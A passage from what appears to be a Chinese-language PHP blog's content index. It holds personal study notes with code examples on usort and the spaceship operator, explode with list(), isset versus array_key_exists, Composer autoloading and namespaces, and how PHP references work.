class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\">usort($arr,<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($a,$b)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($a == $b)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $a &lt; $b ? <span class=\"number\">-1</span> : <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//由大排到小</span></span><br><span class=\"line\">$arr = [<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\">usort($arr,<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($a,$b)</span></span>&#123; <span class=\"keyword\">return</span> $a &lt; $b&#125;) <span class=\"comment\">//小於、正數在前(true)由大排到小</span></span><br><span class=\"line\">$arr = [<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\">usort($arr,<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($a,$b)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($a == $b)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $a &lt; $b ? <span class=\"number\">1</span> : <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://blog.csdn.net/liuj8929/article/details/79214345\" target=\"_blank\" rel=\"noopener\">PHP usort()的使用 - liuj8929 的博客 - CSDN 博客</a></li>\n<li><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/222935/\" target=\"_blank\" rel=\"noopener\">php 陣列排序 usort、uksort 與 sort 函式用法 | 程式前沿</a></li>\n<li><a href=\"https://www.jianshu.com/p/4d787d88654d\" target=\"_blank\" rel=\"noopener\">关于 php 中 usort 函数的解读 - 简书</a></li>\n</ul>\n<h3 id=\"PHP-另類比較方法-lt-gt\"><a href=\"#PHP-另類比較方法-lt-gt\" class=\"headerlink\" title=\"PHP 另類比較方法 &lt;=&gt;\"></a>PHP 另類比較方法 &lt;=&gt;</h3><h4 id=\"太空船操作符（組合比較符）\"><a href=\"#太空船操作符（組合比較符）\" class=\"headerlink\" title=\"太空船操作符（組合比較符）\"></a>太空船操作符（組合比較符）</h4><p>太空船操作符用於比較兩個表達式。當$a小於(-1)、等於(0)或大於(1)$b 時它分別返回-1、0 或 1。 比較的原則是沿用 PHP 的常規比較規則進行的。</p>\n<p>這方法感覺好記!!!<br>但只能用在 PHP 7.1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"comment\">// tested on PHP 7.1</span></span><br><span class=\"line\">$a = [<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">6</span>, <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>];</span><br><span class=\"line\">$asc = $desc = $a;</span><br><span class=\"line\">usort($asc, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(int $a, int $b)</span> </span>&#123; <span class=\"keyword\">return</span> ($a &lt;=&gt; $b); &#125;);</span><br><span class=\"line\">usort($desc, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(int $a, int $b)</span> </span>&#123; <span class=\"keyword\">return</span> -($a &lt;=&gt; $b); &#125;);</span><br><span class=\"line\">print_r([ $a, $asc, $desc ]);</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/30365346/what-is-the-spaceship-operator-in-php-7\" target=\"_blank\" rel=\"noopener\">What is &lt;=&gt; (the ‘Spaceship’ Operator) in PHP 7? - Stack Overflow</a></li>\n<li><a href=\"https://wiki.php.net/rfc/combined-comparison-operator\" target=\"_blank\" rel=\"noopener\">PHP: rfc:combined-comparison-operator</a></li>\n</ul>\n<p>還有多個欄位排序方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">order_func</span><span class=\"params\">($a, $b)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [$a-&gt;x, $a-&gt;y, $a-&gt;foo] &lt;=&gt; [$b-&gt;x, $b-&gt;y, $b-&gt;foo];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// or</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">order_func</span><span class=\"params\">($a, $b)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ($a-&gt;$x &lt;=&gt; $b-&gt;x) ?: ($a-&gt;y &lt;=&gt; $b-&gt;y) ?: ($a-&gt;foo &lt;=&gt; $b-&gt;foo);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"shuffle\"><a href=\"#shuffle\" class=\"headerlink\" title=\"shuffle\"></a>shuffle</h2><p><code>shuffle ( array &amp;$array ) : bool</code></p>\n<p>隨機排序陣列函式。</p>\n<p>實用!!!</p>\n<h2 id=\"explode-list\"><a href=\"#explode-list\" class=\"headerlink\" title=\"explode = list()\"></a>explode = list()</h2><p><code>explode ( string $delimiter , string $string [, int $limit = PHP_INT_MAX ] ) : array</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$data = <span class=\"string\">\"foo:*:1023:1000::/home/foo:/bin/sh\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">list</span>($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(<span class=\"string\">\":\"</span>, $data);</span><br></pre></td></tr></table></figure>\n<p>老實說我不常這樣寫，算是小記</p>\n<h2 id=\"array-key-exists-vs-isset\"><a href=\"#array-key-exists-vs-isset\" class=\"headerlink\" title=\"array_key_exists() vs isset()\"></a>array_key_exists() vs isset()</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$search_array = <span class=\"keyword\">array</span>(<span class=\"string\">'first'</span> =&gt; <span class=\"keyword\">null</span>, <span class=\"string\">'second'</span> =&gt; <span class=\"number\">4</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// returns false</span></span><br><span class=\"line\"><span class=\"keyword\">isset</span>($search_array[<span class=\"string\">'first'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// returns true</span></span><br><span class=\"line\">array_key_exists(<span class=\"string\">'first'</span>, $search_array);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"其他小記-感想\"><a href=\"#其他小記-感想\" class=\"headerlink\" title=\"其他小記(感想)\"></a>其他小記(感想)</h2><p>最近寫久了，雖然覺得 PHP 處理 array 很方便，但發現都是 function base 程式寫上面不是很方便<br>最近剛好看到 Laravel 有 Collection ， 改善我上面說的缺點<br>有爬過文章說跟 array 校能差不多!!<br><a href=\"https://laravel.tw/docs/5.2/collections\" target=\"_blank\" rel=\"noopener\">集合 - Laravel - 為網頁藝術家創造的 PHP 框架</a></p>\n","categories":["PHP"],"tags":["php","array"]},{"title":"PHP內建自動載入autoload方式跟常誤會一些觀念","url":"/blog/2019/01/18/PHP%E5%85%A7%E5%BB%BA%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5autoload%E6%96%B9%E5%BC%8F%E8%B7%9F%E5%B8%B8%E8%AA%A4%E6%9C%83%E4%B8%80%E4%BA%9B%E8%A7%80%E5%BF%B5/","content":"<p>最近有計畫學 Laravel<br>不過想趁機會把 PHP <code>Namespace</code>搞清楚<br>我在想<code>autoload</code>自動載入是甚麼機制的<br>最近小小的玩了一下，才知道這個<code>自動載入</code>是怎麼用的<br>其實我覺得也不是完全自動載入阿~~終究還是手動需做載入一段程式</p>\n<a id=\"more\"></a>\n<h2 id=\"PHP-原有-autoload-方式\"><a href=\"#PHP-原有-autoload-方式\" class=\"headerlink\" title=\"PHP 原有 autoload 方式\"></a>PHP 原有 autoload 方式</h2><p>include, include_once, require , require_once</p>\n<p>都是載入功能。<br>比較特別注意 include 當載入失敗會跳出警告，但是不會停止程式<br>require 載入失敗會跳出錯誤，不會繼續執行下面程式</p>\n<p>常常忘記哪個會載入錯誤 orz<br>順便記載這邊</p>\n<h2 id=\"PHP-Autoload\"><a href=\"#PHP-Autoload\" class=\"headerlink\" title=\"PHP Autoload\"></a>PHP Autoload</h2><p>前面兩個是比較早期的自動載入方式。簡單來講就是自動載入<code>xxx.php</code>方法<br>後面 namespace 可搭配<code>composer</code>實作</p>\n<ul>\n<li>__autoload</li>\n<li>spl_autoload</li>\n<li>autoload 與 namespace</li>\n</ul>\n<p><a href=\"http://justericgg.logdown.com/posts/196891-php-series-autoload\" target=\"_blank\" rel=\"noopener\">PHP 系列 - Autoload 自動載入 « Eric G. Huang 不像樣工程師</a> <a href=\"/blog/2019/01/18/PHP內建自動載入autoload方式跟常誤會一些觀念/web1.png\" title=\"備份圖\">備份圖</a><br>上面連結介紹太清楚了。<br>我這邊仔細記錄我實務的問題</p>\n<h2 id=\"常常搞錯的觀念\"><a href=\"#常常搞錯的觀念\" class=\"headerlink\" title=\"常常搞錯的觀念\"></a>常常搞錯的觀念</h2><p>我是有學過 Java，所以對 Java Namespace 不是很陌生<br>但當初看 PHP 的 Namespace 有看沒有懂<br>學得他們很像，但又不是很像<br>但說 Java Namespace 定義很清楚<br>PHP 並沒有那麼清楚(畢竟是腳本語言….)</p>\n<h3 id=\"還是需要放置載入程式\"><a href=\"#還是需要放置載入程式\" class=\"headerlink\" title=\"還是需要放置載入程式\"></a>還是需要放置載入程式</h3><p>首先來看看 Laravel 的 Controller.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Foundation</span>\\<span class=\"title\">Bus</span>\\<span class=\"title\">DispatchesJobs</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Routing</span>\\<span class=\"title\">Controller</span> <span class=\"title\">as</span> <span class=\"title\">BaseController</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Foundation</span>\\<span class=\"title\">Validation</span>\\<span class=\"title\">ValidatesRequests</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Foundation</span>\\<span class=\"title\">Auth</span>\\<span class=\"title\">Access</span>\\<span class=\"title\">AuthorizesRequests</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Controller</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseController</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">AuthorizesRequests</span>, <span class=\"title\">DispatchesJobs</span>, <span class=\"title\">ValidatesRequests</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><del>看到這個我整個高潮了</del><br>其實我以為 PHP 已經完完整整可以自動載入<br>不過我自己實作卻是不能…<br>最終爬文還是找到答案</p>\n<p><del>下面那篇 PO 文跟我一樣 HI XD</del><br><a href=\"https://www.oschina.net/question/123890_135938?sort=default&amp;p=2\" target=\"_blank\" rel=\"noopener\">php 的 use 明顯比 require 高端大氣上檔次 - 開源中國</a><br><a href=\"https://www.oschina.net/question/147332_138188\" target=\"_blank\" rel=\"noopener\">php 使用命名空间:导入导出之疑问 - 开源中国</a></p>\n<p>為什麼 Laravel 的 Controller.php 可以自動載入<br>關鍵還是 index.php 的<code>require __DIR__.&#39;/../vendor/autoload.php&#39;;</code><br>所以我才說也不是真正的自動載入<br>不過方法真的已經比以前好很多</p>\n<h2 id=\"發現我自己寫的-PHP-沒辦法-use-使用到\"><a href=\"#發現我自己寫的-PHP-沒辦法-use-使用到\" class=\"headerlink\" title=\"發現我自己寫的 PHP 沒辦法 use 使用到\"></a>發現我自己寫的 PHP 沒辦法 use 使用到</h2><p>當以為你以為<code>require &#39;vendor/autoload.php&#39;;</code>可以載入所有 php 檔案內容<br>你可能就大錯特錯了!!!</p>\n<p>composer.json 有一個 classmap 自動載入</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    \"autoload\": &#123;</span><br><span class=\"line\">    \t\"classmap\": &#123;</span><br><span class=\"line\">    \t\t<span class=\"string\">\"mylib\"</span></span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><del>但不能設定<code>.</code></del>可以設定<code>.</code><br>發現我寫錯了，應該要用陣列才對<br>上面能跑純屬意外</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    \"autoload\": &#123;</span><br><span class=\"line\">    \t\"classmap\": [</span><br><span class=\"line\">    \t\t<span class=\"string\">\".\"</span></span><br><span class=\"line\">    \t]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"發現新增檔案跟修改-class-名稱沒有自動載入到\"><a href=\"#發現新增檔案跟修改-class-名稱沒有自動載入到\" class=\"headerlink\" title=\"發現新增檔案跟修改 class 名稱沒有自動載入到\"></a>發現新增檔案跟修改 class 名稱沒有自動載入到</h2><p>當我發現這件事，還以為我哪裡寫錯了<br>其實有看到這篇<a href=\"http://jsnwork.kiiuo.com/archives/2437/php-composer-json-%e8%a8%ad%e5%ae%9a-classmap-%e6%8c%87%e5%ae%9a%e8%87%aa%e5%8b%95%e8%ae%80%e5%8f%96%e7%9a%84%e6%aa%94%e6%a1%88%e6%88%96%e8%b7%af%e5%be%91/\" target=\"_blank\" rel=\"noopener\">php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork</a><br>vendor/composer/autoload_classmap.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// autoload_classmap.php @generated by Composer</span></span><br><span class=\"line\"></span><br><span class=\"line\">$vendorDir = dirname(dirname(<span class=\"keyword\">__FILE__</span>));</span><br><span class=\"line\">$baseDir = dirname($vendorDir);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'mylib\\\\Test'</span> =&gt; $baseDir . <span class=\"string\">'/mylib/test.php'</span>,</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>看到原來自動載入原來不是真的跑每一層資料夾<br>是透過暫存方式載入<br>之前一直還在想有什麼辦法看到目前會自動載入哪些<br>看來還是有辦法知道的</p>\n<h2 id=\"PSR0-PSR4\"><a href=\"#PSR0-PSR4\" class=\"headerlink\" title=\"PSR0 , PSR4\"></a>PSR0 , PSR4</h2><p>看了一下好像都是自動載入<br>PSR0 命名規則跟 JAVA 很像<br>但是 PSR4 規則也不一定要跟 JAVA 擺放位置一樣<br>我也沒看很詳細，有空再仔細吸收….<br><a href=\"https://segmentfault.com/a/1190000006686978\" target=\"_blank\" rel=\"noopener\">psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否</a></p>\n<h2 id=\"Namespace-一些事\"><a href=\"#Namespace-一些事\" class=\"headerlink\" title=\"Namespace 一些事\"></a>Namespace 一些事</h2><p>Namespace 是不分大小寫的，跟 class、function 一樣沒有分<br>但是在 use 引用變數(ex:\\$a)<br>想說 class 會不會跟 function 一樣不能共用一樣名字<br>但測試結果是可以的<br>我還滿驚呆</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"comment\">//Enter your code here, enjoy!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'A'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'aa'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> A();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'========'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span>  A();</span><br></pre></td></tr></table></figure>\n<p>結果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">A========aa</span><br></pre></td></tr></table></figure>\n<p>那同時去做 use A 不知道會<br>但用在 use 呢?!<br>經過小小實驗(未確任是否正確，自己得出的結論)<br>function 要用通常是要用<br><code>use function xxxx</code><br>但是做 classmap 跟 psr-4 都載入不到(不知道為什麼)<br>但有找到<a href=\"https://stackoverflow.com/questions/24171078/composer-psr-how-to-autoload-functions\" target=\"_blank\" rel=\"noopener\">Composer/PSR - How to autoload functions? - Stack Overflow</a><br><a href=\"https://laravel-china.org/topics/1002/deep-composer-autoload\" target=\"_blank\" rel=\"noopener\">深入 Composer autoload | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区</a><br>要選<code>files</code><br>不過沒有什麼事情還是不要用 function 吧 XD<br>這我就沒實作確認</p>\n<p>感覺 composer,psr0,psr4 之後還是需要好好了解<br>先記錄到這邊</p>\n<p>參考來源：</p>\n<ul>\n<li><a href=\"https://laravel-china.org/index.php/topics/6998/have-anyone-used-phps-use-function\" target=\"_blank\" rel=\"noopener\">有人用过 PHP 的 use function 吗？ | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区</a></li>\n<li><a href=\"http://justericgg.logdown.com/posts/196891-php-series-autoload\" target=\"_blank\" rel=\"noopener\">PHP 系列 - Autoload 自動載入 « Eric G. Huang 不像樣工程師</a></li>\n<li><a href=\"http://jonas1011.pixnet.net/blog/post/24303632-%5Bphp%5Drequire-%E5%92%8C-include\" target=\"_blank\" rel=\"noopener\">[PHP]require 和 include @ Jonas’s Blog :: 痞客邦 ::</a></li>\n<li><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">PHP Sandbox, test PHP online, PHP tester</a></li>\n<li><a href=\"http://blog.turn.tw/?p=1122\" target=\"_blank\" rel=\"noopener\">Composer 進階原理：PHP 命名空間與 PSR-0 | 轉個彎日誌</a> <a href=\"/blog/2019/01/18/PHP內建自動載入autoload方式跟常誤會一些觀念/web2.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"http://blog.turn.tw/?p=1039\" target=\"_blank\" rel=\"noopener\">Composer 設計原理與基本用法 | 轉個彎日誌</a> <a href=\"/blog/2019/01/18/PHP內建自動載入autoload方式跟常誤會一些觀念/web3.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"http://jsnwork.kiiuo.com/archives/2437/php-composer-json-%E8%A8%AD%E5%AE%9A-classmap-%E6%8C%87%E5%AE%9A%E8%87%AA%E5%8B%95%E8%AE%80%E5%8F%96%E7%9A%84%E6%AA%94%E6%A1%88%E6%88%96%E8%B7%AF%E5%BE%91/\" target=\"_blank\" rel=\"noopener\">php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork</a></li>\n<li><a href=\"https://my.oschina.net/sallency/blog/893518\" target=\"_blank\" rel=\"noopener\">composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国</a></li>\n<li><a href=\"http://jsnwork.kiiuo.com/archives/2618/php-compoer-%E9%9D%9E%E5%B8%B8%E7%B0%A1%E5%96%AE%E7%9A%84%E4%BD%BF%E7%94%A8-psr-4-%E4%BE%86%E5%BB%BA%E7%AB%8B%E8%87%AA%E5%8B%95%E8%AE%80%E5%8F%96%E9%A1%9E%E5%88%A5/\" target=\"_blank\" rel=\"noopener\">php – Compoer – 非常簡單的使用 psr-4 來建立自動讀取類別 | jsnWork</a></li>\n<li><a href=\"http://jsnwork.kiiuo.com/archives/2437/php-composer-json-%e8%a8%ad%e5%ae%9a-classmap-%e6%8c%87%e5%ae%9a%e8%87%aa%e5%8b%95%e8%ae%80%e5%8f%96%e7%9a%84%e6%aa%94%e6%a1%88%e6%88%96%e8%b7%af%e5%be%91/\" target=\"_blank\" rel=\"noopener\">php – composer.json 設定 classmap 指定自動讀取的檔案或路徑 | jsnWork</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006686978\" target=\"_blank\" rel=\"noopener\">psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否</a></li>\n<li><a href=\"https://stackoverflow.com/questions/24868586/what-are-the-differences-between-psr-0-and-psr-4\" target=\"_blank\" rel=\"noopener\">php - What Are the Differences Between PSR-0 and PSR-4? - Stack Overflow</a></li>\n<li><a href=\"https://www.kancloud.cn/xiak/php-node/191121\" target=\"_blank\" rel=\"noopener\">PSR-0/PSR-4 命名标准 · php 笔记 · 看云</a></li>\n<li><a href=\"https://blog.csdn.net/sky_zhe/article/details/38615615\" target=\"_blank\" rel=\"noopener\">PHP PSR-4 与 PSR-0 规范 - zHHHe 的专栏 - CSDN 博客</a></li>\n<li><a href=\"https://www.oschina.net/question/123890_135938?sort=default&amp;p=2\" target=\"_blank\" rel=\"noopener\">php 的 use 明顯比 require 高端大氣上檔次 - 開源中國</a></li>\n<li><a href=\"https://www.oschina.net/question/147332_138188\" target=\"_blank\" rel=\"noopener\">php 使用命名空间:导入导出之疑问 - 开源中国</a></li>\n<li><a href=\"https://laravel-china.org/topics/1002/deep-composer-autoload\" target=\"_blank\" rel=\"noopener\">深入 Composer autoload | Laravel China 社区 - 高品质的 Laravel 和 PHP 开发者社区</a></li>\n<li><a href=\"https://oomusou.io/php/php-namespace/\" target=\"_blank\" rel=\"noopener\">如何使用 Namespace? | 點燈坊</a></li>\n<li><a href=\"https://www.codementor.io/jadjoubran/php-tutorial-getting-started-with-composer-8sbn6fb6t\" target=\"_blank\" rel=\"noopener\">PHP Tutorial: Getting Started with Composer | Codementor</a></li>\n</ul>\n","categories":["PHP"],"tags":["composer","autoload"]},{"title":"PHP有關參照(Reference)的那些事","url":"/blog/2019/01/28/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/","content":"<p>最近在看 PHP 官方參考文件<br>一直以為 PHP 有一個指針(pointer)觀念<br>今天讀到官網說「PHP 不是 reference、也不是 pinter 觀念」(雖然這樣想幾乎 87%都不會有問題)<br>瞬間有點黑人問號臉<br>也許是剛學時候就用這樣記住<br>但是今天要好好重新認識 PHP Reference<br>聽說就跟 Linux Hard Link 一樣的道理</p>\n<a id=\"more\"></a>\n<h2 id=\"PHP-參照不是指針-pointer\"><a href=\"#PHP-參照不是指針-pointer\" class=\"headerlink\" title=\"PHP 參照不是指針(pointer)\"></a>PHP 參照不是指針(pointer)</h2><p><a href=\"http://php.net/manual/zh/language.references.whatare.php\" target=\"_blank\" rel=\"noopener\">PHP: 引用是什么 - Manual</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">在 PHP 中引用意味著用不同的名字訪問同一個變量內容。這並不像 C 的指針：例如你不能對他們做指針運算，他們並不是實際的內存地址…… 查看引用不是什麼瞭解更多信息。 替代的是，引用是符號表別名。注意在PHP 中，變量名和變量內容是不一樣的， 因此同樣的內容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——變量名是目錄條目，而變量內容則是文件本身。引用可以被看作是 Unix 文件系統中的硬鏈接。</span><br></pre></td></tr></table></figure>\n<p>這樣看真的沒有懂</p>\n<p>直接看下面的<em>User Contributed Notes</em>人家給的範例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> = <span class=\"string\">\"foo\"</span>;</span><br><span class=\"line\">$ref1 =&amp; $var; <span class=\"comment\">// new object that references $var</span></span><br><span class=\"line\">$ref2 =&amp; $ref1; <span class=\"comment\">// references $var directly, not $ref1!!!!!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ref1; <span class=\"comment\">// &gt;foo</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">unset</span>($ref1);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ref1; <span class=\"comment\">// &gt;Notice:  Undefined variable: ref1</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ref2; <span class=\"comment\">// &gt;foo</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $var; <span class=\"comment\">// &gt;foo</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>其實這個範例可以很簡單看出來，刪除<code>unset</code> $ref1變數不會影響到$ref2<br>這個我記得在 Java 會直接 byebye<br><del>JavaScript 發現不能用 delete object，看來要找天測試是為什麼</del><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/delete\" target=\"_blank\" rel=\"noopener\">delete operator | MDN</a></p>\n<p>再看<a href=\"http://php.net/manual/zh/language.references.whatdo.php\" target=\"_blank\" rel=\"noopener\">PHP: 引用做什么 - Manual</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a =&amp; $b;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>Note:</strong></p>\n<ul>\n<li>$a 和 $b 在這裡是完全相同的，這並不是 $a 指向了 $b 或者相反，而是 $a 和 $b 指向了同一個地方。</li>\n<li>如果具有引用的數組被拷貝，其值不會解除引用。對於數組傳值給函數也是如此。</li>\n</ul>\n<h2 id=\"參照\"><a href=\"#參照\" class=\"headerlink\" title=\"參照\"></a>參照</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"number\">1</span>;</span><br><span class=\"line\">$b = &amp;$a;</span><br><span class=\"line\">$b++;</span><br><span class=\"line\">$c = $b;</span><br><span class=\"line\">$a = <span class=\"number\">0</span>;</span><br><span class=\"line\">var_dump($c);   <span class=\"comment\">#2</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"number\">1</span>;</span><br><span class=\"line\">$b = &amp;$a;</span><br><span class=\"line\">$b++;</span><br><span class=\"line\">$c = &amp;$b;</span><br><span class=\"line\">$a = <span class=\"number\">0</span>;</span><br><span class=\"line\">var_dump($c);   <span class=\"comment\">#0</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"官網神奇的範例…\"><a href=\"#官網神奇的範例…\" class=\"headerlink\" title=\"官網神奇的範例…\"></a>官網神奇的範例…</h2><p>如果對一個未定義的變量進行引用賦值、引用參數傳遞或引用返回，則會自動創建該變量。<br>這一段真的很神奇…，不過應該是 function 會宣告上面的變數。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">(&amp;$var)</span> </span>&#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo($a); <span class=\"comment\">// $a is \"created\" and assigned to null</span></span><br><span class=\"line\"></span><br><span class=\"line\">$b = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">foo($b[<span class=\"string\">'b'</span>]);</span><br><span class=\"line\">var_dump(array_key_exists(<span class=\"string\">'b'</span>, $b)); <span class=\"comment\">// bool(true)</span></span><br><span class=\"line\"></span><br><span class=\"line\">$c = <span class=\"keyword\">new</span> 